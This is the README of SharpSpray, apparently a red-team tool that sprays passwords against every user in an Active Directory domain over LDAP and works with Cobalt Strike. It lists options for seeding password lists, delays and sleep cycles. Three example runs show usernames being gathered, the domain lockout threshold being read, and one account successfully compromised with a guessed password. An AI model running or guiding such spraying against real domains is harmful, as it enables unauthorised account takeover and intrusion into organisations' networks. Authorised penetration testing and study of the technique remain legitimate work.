# SharpSpray
This project is a C# port of my PowerSpray.ps1 script. SharpSpray a simple code set to perform a password spraying attack against all users of a domain using LDAP and is compatible with Cobalt Strike.

https://github.com/jnqpblc/Misc-PowerShell/blob/master/PowerSpray.ps1

By default it will automatically generate the UserList from the domain.

By default it will automatically generate the PasswordList using the current date.

Be careful not to lockout any accounts.

```
SharpSpray.exe
      --Seeds [ A comma-separated list of passwords to as a seed to the internal list generator. Eg. Password,Welcome,Company ]
      --Passwords [ A comma-separated list of passwords to use instead of the internal list generator. Eg. Password1,Password19,Company19,Welcome19 ]
      --Delay [ The delay time between guesses in millisecounds. Eg. 300 ]
      --Sleep [ The number of minutes to sleep between password cycles. Eg. 15 ]

C:\Users\jnqpblc\Desktop>SharpSpray.exe --Sleep 15
[+] Successfully collected 42 usernames from Active Directory.
[*] The Lockout Threshold for the current domain is 10.
[*] The Min Password Length for the current domain is 10.
[+] Successfully generated a list of 64 passwords.
[*] Starting password spraying operations.
[*] Using the default delay of 1000 milliseonds between attempts.
[*] Using password Winter19
^C

C:\Users\jnqpblc\Desktop>SharpSpray.exe --Seeds Password,Welcome,Company --Sleep 15
[+] Successfully collected 42 usernames from Active Directory.
[*] The Lockout Threshold for the current domain is 10.
[*] The Min Password Length for the current domain is 10.
[+] Successfully generated a list of 42 passwords.
[*] Starting password spraying operations.
[*] Using the default delay of 1000 milliseonds between attempts.
[*] Using password Password19
^C

C:\Users\jnqpblc\Desktop>SharpSpray.exe --Passwords ItsNotWinter! --Sleep 15 --Delay 300
[+] Successfully collected 42 usernames from Active Directory.
[*] The Lockout Threshold for the current domain is 10.
[*] The Min Password Length for the current domain is 10.
[+] Successfully generated a list of 1 passwords.
[*] Starting password spraying operations.
[*] Using a delay of 300 milliseonds between attempts.
[*] Using password ItsNotWinter!
[+] Successfully authenticated with jnqpblc::ItsNotWinter!
[*] Completed all rounds with password ItsNotWinter!
[*] Now the script will sleep for 15 minutes.
^C
```
